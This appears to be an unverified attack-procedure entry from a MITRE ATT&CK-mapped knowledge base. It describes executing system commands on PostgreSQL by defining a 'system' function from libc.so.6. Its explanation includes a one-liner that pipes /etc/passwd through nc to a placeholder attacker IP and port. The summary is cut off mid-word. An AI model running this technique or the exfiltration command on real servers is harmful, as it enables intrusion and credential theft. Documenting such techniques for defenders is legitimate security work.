---
id: 15675994-382e-4a7d-b1b4-edbf590ea6ba
name: PostgreSQL Command Execution using libc.so.6
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:36.053825+00:00'
updated_at: '2023-04-10T20:23:20.712748+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[PostgreSQL Command execution]]'
- '[[PostgreSQL injection]]'
- '[[Using libc.so.6]]'
---

# PostgreSQL Command Execution using libc.so.6

## Summary

PostgreSQL injection is a technique used by attackers to execute arbitrary commands on a PostgreSQL database server. Using the libc.so.6 library, attackers can bypass security measures and execute commands on the underlying operating system. This technique can be used to gain access to sensitive da

## Description

# Description

PostgreSQL injection is a technique used by attackers to execute arbitrary commands on a PostgreSQL database server. Using the libc.so.6 library, attackers can bypass security measures and execute commands on the underlying operating system. This technique can be used to gain access to sensitive data or to compromise the entire system.

To execute commands using this technique, attackers must first identify a vulnerability in the PostgreSQL server that allows for injection. Once the vulnerability is identified, the attacker can use the 'Execute Command and Send /etc/passwd to Attacker IP' command to execute arbitrary commands on the server and send the output to their own IP address.

By executing commands on a PostgreSQL server, attackers can gain access to sensitive data, compromise the system, and launch further attacks against other systems in the network.

 

## Requirements

1. Access to the vulnerable PostgreSQL server

1. Knowledge of the vulnerability and the libc.so.6 library

1. Tools to execute the 'Execute Command and Send /etc/passwd to Attacker IP' command

 

## Defense

1. Regularly update and patch the PostgreSQL server to prevent vulnerabilities

1. Implement strong access controls and authentication mechanisms to limit access to the server

1. Monitor network traffic for suspicious activity and anomalous behavior

 

## Objectives

1. Execute arbitrary commands on the PostgreSQL server

1. Gain access to sensitive data on the server

1. Compromise the entire system

 

# Instructions

1. Run the following SQL command to execute a system command and send the contents of the /etc/passwd file to an attacker controlled IP address and port.

 



**Code**: [[CREATE OR REPLACE FUNCTION system(cstring) RETURNS]]



> This command creates a SQL function called 'system' that can execute arbitrary system commands. The SELECT statement then uses this function to execute the command 'cat /etc/passwd | nc <attacker IP> <attacker port>', which sends the contents of the /etc/passwd file to the specified IP address and port using the 'nc' command. This can be used by an attacker to exfiltrate sensitive information such as user account credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Tags

- [[PostgreSQL Command execution]]
- [[PostgreSQL injection]]
- [[Using libc.so.6]]


